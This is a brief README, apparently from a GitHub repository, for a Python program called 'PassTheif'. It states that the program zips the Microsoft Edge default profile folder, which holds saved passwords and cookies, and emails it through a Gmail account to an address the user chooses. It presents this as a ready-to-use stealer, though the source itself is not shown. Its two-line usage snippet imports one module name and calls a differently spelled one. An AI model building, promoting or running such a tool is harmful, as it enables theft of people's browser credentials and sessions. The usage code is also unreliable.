# PassTheif program

This program will, when executed, grab the entire edge default folder 
end email it to a chosen email address. You will not need to install any 
packages.

The file will compress the edge default folder and send it using `smtplib` 
to the email you input. You will need to use a gmail account for this 
to work. you will need to replace the placeholder text starting from 
[line 11](https://github.com/voidarclabs/py.passtheif/blob/main/test.py#L11)

# To run:

```
import passthief

passtheif.grab()
```